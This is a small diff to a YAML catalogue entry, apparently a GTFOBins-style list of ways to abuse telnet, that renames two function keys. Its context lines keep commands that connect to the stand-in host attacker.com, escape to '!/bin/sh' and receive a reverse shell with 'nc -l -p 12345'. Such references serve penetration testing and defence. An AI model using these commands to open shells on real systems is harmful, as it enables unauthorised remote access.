@@ -1,6 +1,6 @@
 ---
 functions:
-  exec-interactive:
+  execute-interactive:
     - description: BSD version only. Needs to be connected first.
       code: |
         RHOST=attacker.com
@@ -8,7 +8,7 @@ functions:
         telnet $RHOST $RPORT
         ^]
         !/bin/sh
-  reverse-shell:
+  reverse-shell-interactive:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         RHOST=attacker.com
